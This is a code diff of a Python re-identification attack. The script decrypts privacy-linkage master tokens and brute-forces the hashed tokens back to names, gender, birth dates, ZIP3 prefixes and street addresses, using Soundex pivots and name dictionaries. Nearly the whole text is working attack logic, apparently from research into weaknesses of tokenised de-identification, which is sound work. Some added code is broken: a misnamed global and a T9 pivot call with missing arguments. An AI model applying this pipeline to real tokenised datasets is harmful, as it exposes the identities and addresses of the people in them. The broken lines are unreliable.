     contains = master_tokens.__contains__
@@ -703,6 +748,17 @@ def attack_T7_via_T2T1(master_tokens, ln_b, sdx_fn_b, g_b, dob_b, init_hasher):
     return hits
 
 def pivot_to_T4_fast(master_tokens, FN_BY_INITIAL, FN_BY_SDX, t1_hit, t2_hit, init_hasher):
+    """
+    Pivot:          Recover T4 (ln|fn|g|dob) using constraints from T1 (fi) and T2 (sdx_fn).
+    Strategy:       Filter the dictionary of First Names.
+                    1. Must start with the Initial (fi) from T1.
+                    2. If T2 hit is available, must also match the Soundex (sdx_fn) from T2.
+                    This intersection drastically reduces the candidate pool.
+    Complexity:     O(Filtered_First_Names)
+    
+    Returns:
+        Map { master_token: (ln, fn, g, dob) }
+    """
     ln, fi, g, dob = t1_hit
     contains = master_tokens.__contains__
     cand_fns = FN_BY_INITIAL.get(fi[:1], [])
@@ -728,8 +784,15 @@ def pivot_to_T4_fast(master_tokens, FN_BY_INITIAL, FN_BY_SDX, t1_hit, t2_hit, in
 
 def pivot_to_T4_via_T7(master_tokens, ln_b, fi3_b, g_b, dob_b, FIRST3_MAP,init_hasher):
     """
-    Recover T4 (ln|fn|g|dob) candidates from a T7 hit (ln|fi3|g|dob) using a
-    precomputed prefix -> names map for first 3 letters.
+    Pivot:          Recover T4 (ln|fn|g|dob) from T7 (ln|fi3|g|dob).
+    Strategy:       We know the Last Name and the first 3 letters (fi3) of the First Name.
+                    Use a map `FIRST3_MAP` (fi3 -> [full_names]) to retrieve all dictionary 
+                    names that start with this 3-letter prefix.
+                    Test these candidates against T4.
+    Complexity:     O(Dictionary_Names_with_Prefix) -> Typically very small (< 5)
+    
+    Returns:
+        Map { master_token: (ln, fn, g, dob) }
     """
     hits = {}
     contains = master_tokens.__contains__
@@ -750,8 +813,16 @@ def pivot_to_T4_via_T7(master_tokens, ln_b, fi3_b, g_b, dob_b, FIRST3_MAP,init_h
 
 def pivot_to_T4_via_T7_T2(master_tokens, sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher):
     """
-    Recover T4 (ln|fn|g|dob) candidates from a T7 hit (ln|fi3|g|dob) using
-    T2's sdx(ln) and sdx(fn) to limit candidate last/first names.
+    Pivot:          Recover T4 (ln|fn|g|dob) from T7 (fi3) + T2 (sdx_ln, sdx_fn).
+    Strategy:       Used in Pure Brute-Force mode (no dictionary).
+                    1. Generate Last Names from `sdx_ln`.
+                    2. Generate First Names from `sdx_fn`.
+                    3. Filter First Names: Must start with `fi3`.
+                    Test combinations against T4.
+    Complexity:     O(Cand_Last_Names * Filtered_First_Names)
+    
+    Returns:
+        Map { master_token: (ln, fn, g, dob) }
     """
     hits = {}
     contains = master_tokens.__contains__
@@ -784,109 +855,161 @@ def pivot_to_T4_via_T7_T2(master_tokens, sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, 
     return hits
 
 def pivot_to_T3_fast(master_tokens, ln_b, fn_b, dob_b, init_hasher):
+    """
+    Pivot:      T3 <-- T4 (using known Last Name + First Name + DOB to get candidate ZIP3 parts).
+    Strategy:   Use known Last Name, First Name, and DOB to generate candidate ZIP3 parts,
+                then test T3 candidates.
+    Complexity: O(Candidates)
+
+    Returns:
+        Map { master_token: (ln, fn, dob, zip3) }
+    """
     contains = master_tokens.__contains__
-    h0 = init_hasher()
-    h0.update(ln_b); h0.update(SEP); h0.update(fn_b); h0.update(SEP); h0.update(dob_b); h0.update(SEP)
+    h0 = init_hasher(ln_b + SEP + fn_b + SEP + dob_b + SEP)
     hits = {}
     for zpart in ZIP3_PARTS:
         h = h0.copy(); h.update(zpart)
         mt = digest_and_count(h)
-        if contains(mt):
-            hits[mt] = (ln_b, fn_b, dob_b, zpart)  # bytes
+        if contains(mt): hits[mt] = (ln_b, fn_b, dob_b, zpart)
     return hits
 
-def pivot_to_T9_fast(master_tokens, fn_b, address_list_raw, lang, HOUSE_NUMBERS, init_hasher):
+def pivot_to_T9_fast(master_tokens, fn_b, address_list_raw, lang, exclude_house_numbers, HOUSE_NUMBERS, init_hasher):
+    """
+    Pivot:      T9 <-- T4 (using known First Name to get candidate addresses).
+    Strategy:   Use known First Name and address list to generate candidate addresses,
+                then test T9 candidates.
+    Complexity: O(Candidates)
+
+    Returns:
+        Map { master_token: (fn, address) }
+    """
     contains = master_tokens.__contains__
     fn_prefix = init_hasher(fn_b + SEP)
     hits = {}
     for addr_raw in address_list_raw:
-        street_b, number_b = split_address_b(addr_raw, lang)
-        if not street_b:
-            continue
-        if lang == "de":
-            for num_b in HOUSE_NUMBERS:
-                h = fn_prefix.copy(); h.update(street_b + num_b)
-                mt = digest_and_count(h)
-                if contains(mt):
-                    hits[mt] = (fn_b, street_b + num_b)
-        elif lang == "us":
-            for num_b in HOUSE_NUMBERS:
-                h = fn_prefix.copy(); h.update(num_b + street_b)
-                mt = digest_and_count(h)
-                if contains(mt):
-                    hits[mt] = (fn_b, num_b + street_b)
+        street_b, number_b_from_split = split_address_b(addr_raw, lang)
+        if not street_b: continue
+        full_addrs_b = []
+        norm_street_only = street_b
+        if exclude_house_numbers:
+            full_addrs_b.append(norm_street_only)
         else:
-            h = fn_prefix.copy(); h.update(street_b + number_b)
+            if lang == "de":
+                for num_b in HOUSE_NUMBERS: full_addrs_b.append(norm_street_only + num_b)
+                if number_b_from_split: full_addrs_b.append(norm_street_only + number_b_from_split)
+                else: full_addrs_b.append(norm_street_only)
+            elif lang == "us":
+                for num_b in HOUSE_NUMBERS: full_addrs_b.append(num_b + norm_street_only)
+                if number_b_from_split: full_addrs_b.append(number_b_from_split + norm_street_only)
+                else: full_addrs_b.append(norm_street_only)
+            else:
+                full_addrs_b.append(street_b + number_b_from_split)
+        for addr_b in set(full_addrs_b):
+            if not addr_b: continue
+            h = fn_prefix.copy(); h.update(addr_b)
             mt = digest_and_count(h)
-            if contains(mt):
-                hits[mt] = (fn_b, street_b + number_b)
+            if contains(mt): hits[mt] = (fn_b, addr_b)
     return hits
 
-# =============================
-# Full brute force functions (used with context of T2 all BF hits)
-# =============================
+# ==============================================================================
+# PURE BRUTE-FORCE WRAPPERS (CONTEXT PRESERVATION)
+# ==============================================================================
+# These functions wrap the core attack logic but add a crucial feature:
+# They preserve the "Context" (e.g., the T2 Soundex codes) along with the hits.
+# This is necessary because in Brute-Force mode, we don't have a static dictionary
+# to look up Soundex codes later; we must carry the recovered Soundex forward
+# to use it as a constraint in subsequent pivots.
 
 def attack_T1_via_T2_pure(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher):
     """
-    Finds T1 preimages from a T2 hit and returns them *with* the T2 context.
+    Wrapper for T1 Attack (via T2) that preserves T2 context.
+    
+    Purpose:
+        When we crack T1 using T2, we want to remember the T2 values (Soundexes)
+        that allowed us to find this T1. This T2 info is needed later to crack T4.
+        
+    Returns:
+        Map { master_token: ( t1_preimage, t2_preimage ) }
+        where:
+          t1_preimage = (ln, fi, g, dob)
+          t2_preimage = (sdx_ln, sdx_fn, g, dob)
     """
     hits_with_context = {}
-    # Get the T1 hits (ln, fi, g, dob)
+    
+    # 1. Execute the core attack logic
+    # (Note: In pure brute-force, LN_BY_SDX might be empty or unused if using generators, 
+    #  depending on how you wired the inner function. If using 'attack_T1_via_T2', 
+    #  ensure it supports the generator logic or that you are using the generator variant.)
     t1_hits = attack_T1_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
     
+    # 2. Attach Context
     t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
+    
     for mt, t1_preimage in t1_hits.items():
-        # Store as: { mt: ((t1_preimage), (t2_preimage)) }
+        # Save both the new T1 hit AND the old T2 hit that generated it
         hits_with_context[mt] = (t1_preimage, t2_preimage)
         
     return hits_with_context
 
 def attack_T7_via_T1_pure(master_tokens, t1_preimage, t2_preimage, init_hasher):
     """
-    Finds T7 preimages from a T1 hit and returns them *with* the T2 context.
-    t1_preimage = (ln_b, fi_b, g_b, dob_b)
-    t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
+    Wrapper for T7 Attack (via T1) that preserves T2 context.
+    
+    Path: T2 -> T1 -> T7
+    We need to keep carrying T2 forward so it's available for the final T4 step.
     """
     hits_with_context = {}
     (ln_b, fi_b, g_b, dob_b) = t1_preimage
     
-    # Get the T7 hits (ln, fi3, g, dob)
+    # 1. Execute core T7 attack using T1 info (Last Name + Initial)
     t7_hits = attack_T7_via_T1(master_tokens, ln_b, fi_b, g_b, dob_b, init_hasher)
     
+    # 2. Attach Context
     for mt, t7_preimage in t7_hits.items():
-        # Store as: { mt: ((t7_preimage), (t2_preimage)) }
+        # Result: T7 hit + the original T2 Soundex codes
         hits_with_context[mt] = (t7_preimage, t2_preimage)
         
     return hits_with_context
 
 def attack_T7_via_T2_pure(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, init_hasher):
     """
-    Finds T7 preimages from a T2 hit and returns them *with* the T2 context.
+    Wrapper for T7 Attack (via T2 direct) that preserves T2 context.
+    
+    Path: T2 -> T7
     """
     hits_with_context = {}
     
-    # Get the T7 hits (ln, fi3, g, dob)
+    # 1. Execute core T7 attack using T2 info (Soundexes)
     t7_hits = attack_T7_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, init_hasher)
     
+    # 2. Attach Context
     t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
+    
     for mt, t7_preimage in t7_hits.items():
-        # Store as: { mt: ((t7_preimage), (t2_preimage)) }
         hits_with_context[mt] = (t7_preimage, t2_preimage)
         
     return hits_with_context
 
 def pivot_to_T4_via_T1_T2_pure(master_tokens, t1_preimage, t2_preimage, init_hasher):
     """
-    (PURE BRUTE-FORCE)
-    Pivots from a T1 hit to T4, using the T2 context (sdx_fn)
-    to generate all possible first names.
+    Pivot:          T4 (Full Name) from T1 (Initial) + T2 (Soundex).
+    Mode:           Pure Brute-Force (Generator).
     
-    t1_preimage = (ln_b, fi_b, g_b, dob_b)
-    t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
+    Strategy:
+        We have the exact Last Name (from T1).
+        We have the First Name Soundex (from T2 context).
+        We DO NOT have a dictionary.
+        
+        We must use the Soundex Generator to create all possible First Names 
+        that match the Soundex code (`sdx_fn`).
+        We filter these generated names to ensure they match the First Initial (`fi`) from T1.
+        
+    Complexity:     O(Generated_First_Names) ~ 50-100 candidates per record.
     """
     hits = {}
     contains = master_tokens.__contains__
     
+    # Unpack Context
     (ln_b, fi_b, g_b, dob_b) = t1_preimage
     (sdx_ln_b, sdx_fn_b, _, _) = t2_preimage
     
@@ -895,21 +1018,25 @@ def pivot_to_T4_via_T1_T2_pure(master_tokens, t1_preimage, t2_preimage, init_has
     except Exception:
         return hits
         
-    # Pre-hash the known parts: H(ln|)
+    # Optimization: Pre-calculate the hash state for the known parts (Last Name)
     h_ln = init_hasher(ln_b + SEP)
     
-    # Generate all first names (e.g., M400 -> "max", "maxi", "maximilian"...)
-    # The generator already enforces the correct first initial (fi_b)
-    # by starting with the first letter of the soundex code.
-    for fn_b in generate_soundex_preimages(sdx_fn_str, max_length=15): # 15 is a reasonable max
+    # Generator Loop
+    # Generate all first names for the given Soundex (e.g., J500 -> John, Jon, Jan...)
+    # Max length 15 covers vast majority of names.
+    for fn_b in generate_soundex_preimages(sdx_fn_str, max_length=15):
         if not fn_b:
             continue
             
-        # H(ln|fn|)
+        # Implicit Filter: generate_soundex_preimages for 'J500' 
+        # naturally produces names starting with 'J'.
+        # So we don't strictly need to check `fn_b[0] == fi_b` if Soundex is valid.
+        # But explicitly:
+        # if fn_b[:1] != fi_b: continue 
+
+        # Hash T4: H(ln|fn|g|dob)
         h_fn = h_ln.copy(); h_fn.update(fn_b); h_fn.update(SEP)
-        # H(ln|fn|g|)
         h_sig = h_fn.copy(); h_sig.update(g_b); h_sig.update(SEP)
-        # H(ln|fn|g|dob)
         h_final = h_sig.copy(); h_final.update(dob_b)
         
         mt = digest_and_count(h_final)
@@ -919,71 +1046,78 @@ def pivot_to_T4_via_T1_T2_pure(master_tokens, t1_preimage, t2_preimage, init_has
     return hits
 
 # =============================
-# Dictionaries
+# Dictionaries / Distribution Loading
 # =============================
 
 def use_dictionaries(lang: str, bruteforce: bool):
-    """Use hardcoded dictionaries."""
+    """Load hardcoded dictionaries from text files."""
     global TOP_FIRST, TOP_LAST, TOP_ADDRESS
+    TOP_FIRST, TOP_LAST, TOP_ADDRESS = [], [], [] 
+    street_file = "strassennamen.txt" if lang == "de" else "streetnames.txt"
+    try:
+        with open(street_file, "r", encoding="utf-8") as f:
+            TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
+    except FileNotFoundError:
+         print(f"[Warning] Street name file not found: {street_file}")
 
-    if bruteforce == False:
-        if lang == "de":
-            with open("vornamen.txt", "r", encoding="utf-8") as f:
+    if not bruteforce:
+        first_file = "vornamen.txt" if lang == "de" else "firstnames.txt"
+        last_file = "nachnamen.txt" if lang == "de" else "lastnames.txt"
+        try:
+            with open(first_file, "r", encoding="utf-8") as f:
                 TOP_FIRST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
-            with open("nachnamen.txt", "r", encoding="utf-8") as f:
+        except FileNotFoundError:
+             print(f"[Warning] First name file not found: {first_file}")
+        try:
+            with open(last_file, "r", encoding="utf-8") as f:
                 TOP_LAST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
-            with open("strassennamen.txt", "r", encoding="utf-8") as f:
-                TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
-        elif lang == "us":
-            with open("firstnames.txt", "r", encoding="utf-8") as f:
-                TOP_FIRST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
-            with open("lastnames.txt", "r", encoding="utf-8") as f:
-                TOP_LAST = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
-            with open("streetnames.txt", "r", encoding="utf-8") as f:
-                TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
-        else:
-            raise ValueError(f"Unsupported language for hardcoded dictionaries: {lang}")
-    elif bruteforce == True:
-        if lang == "de":
-            with open("strassennamen.txt", "r", encoding="utf-8") as f:
-                TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
-        elif lang == "us":
-            with open("streetnames.txt", "r", encoding="utf-8") as f:
-                TOP_ADDRESS = [line.strip().lower() for line in f if line.strip() and not line.startswith("#")]
-        else:
-            raise ValueError(f"Unsupported language for hardcoded dictionaries: {lang}")
-    else:
-        raise ValueError(f"Invalid bruteforce flag: {bruteforce}")
+        except FileNotFoundError:
+             print(f"[Warning] Last name file not found: {last_file}")
     print(f"[*] Using hardcoded dictionaries: firsts={len(TOP_FIRST)}, lasts={len(TOP_LAST)}, addresses={len(TOP_ADDRESS)}")
 
-# =============================
-# Similiar DB Distribution
-# =============================
 
-# The distribution file (for frequency lists) will be provided via CLI (--dist-file);
-# we initialize the TOP_* structures lazily after parsing arguments.
-
-def load_distribution(dist_file: str, top_n: int):
-    """Load a distribution CSV (similar to ohio_cleaned.csv) and populate global TOP_ lists.
-
-    Expected columns (case-sensitive): first_name, last_name, address
-    """
+def load_distribution(dist_file: str, top_n: int, bruteforce: bool):
+    """Load top N entries from a CSV distribution file."""
     global TOP_FIRST, TOP_LAST, TOP_ADDRESS
-    df = pd.read_csv(dist_file)
+    TOP_FIRST, TOP_LAST, TOP_ADDRESS = [], [], []
+    try:
+        df = pd.read_csv(dist_file)
+    except FileNotFoundError:
+        raise SystemExit(f"Error: Distribution file not found: {dist_file}")
 
-    missing = [c for c in ["first_name", "last_name", "address"] if c not in df.columns]
+    required_cols = ["address"]
+    if not bruteforce:
+        required_cols.extend(["first_name", "last_name"])
+
+    missing = [c for c in required_cols if c not in df.columns]
     if missing:
-        raise ValueError(f"Distribution file '{dist_file}' is missing required columns: {missing}")
+        raise ValueError(f"Distribution file '{dist_file}' missing required columns for selected mode: {missing}")
 
-    TOP_FIRST = df["first_name"].astype(str).str.lower().value_counts().head(top_n).index.tolist()
-    TOP_LAST = df["last_name"].astype(str).str.lower().value_counts().head(top_n).index.tolist()
     TOP_ADDRESS = df["address"].astype(str).str.lower().value_counts().head(top_n).index.tolist()
+    if not bruteforce:
+        TOP_FIRST = df["first_name"].astype(str).str.lower().value_counts().head(top_n).index.tolist()
+        TOP_LAST = df["last_name"].astype(str).str.lower().value_counts().head(top_n).index.tolist()
 
     print(f"[*] Loaded distribution file '{dist_file}': top_n={top_n} (firsts={len(TOP_FIRST)}, lasts={len(TOP_LAST)}, addresses={len(TOP_ADDRESS)})")
 
-# =============================
-# Orchestrator
-# =============================
+# ==============================================================================
+# GLOBAL CONSTANTS AND PRECOMPUTATIONS
+# ==============================================================================
+
+OP_FIRST: list = []
+TOP_LAST: list = []
+TOP_ADDRESS: list = []
+SEX_B = [b"m", b"f", b"u"]
+INITIALS_B = [bytes([c]) for c in range(ord('a'), ord('z')+1)]
+ZIP3_PARTS = [f"{z:03d}".encode("utf-8") for z in range(1000)]
+
+today = date.today()
+min_age, max_age = 18, 80
+min_year, max_year = today.year - max_age, today.year - min_age
+
+# ==============================================================================
+# MAIN ORCHESTRATOR
+# ==============================================================================
 
 def run_attack(args):
     # Load distribution for frequency-based dictionaries
@@ -1008,9 +1142,6 @@ def run_attack(args):
 
     # reverse soundex cache for last names
     last_to_sdx = {ln_b: sdx for sdx, names in LN_BY_SDX.items() for ln_b in names}
-
-    """pri_mmdd = dob_prior_from_dist(pd.read_csv(args.dist_file)) if args.dist_file else {}
-    DOBS_ORDERED = order_dobs(min_year, max_year, pri_mmdd) if pri_mmdd else DOBS_B"""
 
     print("[*] Precomputing all possible Soundex codes...")
     ALL_SDX_LN, ALL_SDX_FN = precompute_all_soundex_codes()
@@ -1049,6 +1180,10 @@ def run_attack(args):
     if all(len(dec[c]) == 0 for c in cols):
         print("[!] No master tokens decrypted. Check: correct AES mode (ECB), key (32 bytes), base64 format, and that tokens are actually encrypted site tokens.")
         return
+
+    # =============================
+    # MODE 1: DICTIONARY/REFERENCE MODE
+    # =============================
 
     # =============================
     # T1 --> T2 --> T4 --> T3 --> T9
@@ -1331,29 +1466,11 @@ def run_attack(args):
             print("[*] Pivoting to T4 (ln|fn|g|dob) using T7 (ln|fi3|g|dob)...")
             start = time.time()
             for _mt7, (ln_b, fi3_b, g_b, dob_b) in t7_hits.items():
-                # We need to find the T4. We have ln, fi3, g, dob.
-                # We can't use the dictionary-based pivot_to_T4_via_T7
-                # because the ln is brute-forced and may not be in the dict.
-                
-                # We need to pivot using T7 and T2.
-                # We need to find the T2 hit that corresponds to this T7 hit.
-                # This is complex. Let's find the T2 hit first.
-                
-                # This path is hard. A simpler way is to find T4 from T7+T2
-                
-                # Find the T2 hits that could have generated this T7 hit
                 sdx_ln_str = ""
-                sdx_fn_str = ""
                 try:
                     sdx_ln_str = soundex(ln_b.decode())
-                    # We can't get sdx_fn from fi3_b
                 except Exception:
                     pass
-                
-                # We will use the T7->T4 pivot that re-generates all T4 candidates
-                # from the T7 hit.
-                
-                # Find all T2 hits that match this ln_b, g_b, dob_b
                 t2_matches = []
                 try:
                     sdx_ln_str = soundex(ln_b.decode())
@@ -1416,6 +1533,10 @@ def run_attack(args):
             print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
             print(f"[Timer] T4: {t4_time:.2f} seconds")
             print(f"[HASHES] Total hash computations so far: {HASHES}")
+
+    # =============================
+    # MODE 2: PURE BRUTEFORCE (GENERATOR)
+    # =============================
 
     # =============================
     # PURE BRUTEFORCE: T2 -> T1 -> T7 -> T4 --> T3 -> T9
@@ -1579,6 +1700,23 @@ def run_attack(args):
             print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
             print(f"[Timer] T4: {t4_time:.2f} seconds")
             print(f"[HASHES] Total hash computations so far: {HASHES}")
+
+    # Final Pivots (Common to both modes if T4 was found)
+    if "T3" in dec and t4_pivot_hits:
+        print("[*] Pivoting to T3 via T4..."); start = time.time()
+        for _, t4_preimage in t4_pivot_hits.items():
+            out = pivot_to_T3_fast(dec["T3"], t4_preimage[0], t4_preimage[1], t4_preimage[3], init_hasher) 
+            t3_pivot_hits.update(out)
+        t3_time = time.time() - start
+        print(f"    -> Found {len(t3_pivot_hits)} T3 ({t3_time:.2f}s). Hashes: {HASHES}")
+
+    if "T9" in dec and t3_pivot_hits:
+        print("[*] Pivoting to T9 via T3..."); start = time.time()
+        for _, t3_preimage in t3_pivot_hits.items():
+            out = pivot_to_T9_fast(dec["T9"], t3_preimage[1], init_hasher)
+            t9_pivot_hits.update(out)
+        t9_time = time.time() - start
+        print(f"    -> Found {len(t9_pivot_hits)} T9 ({t9_time:.2f}s). Hashes: {HASHES}")
 
     # =============================
     # Print results
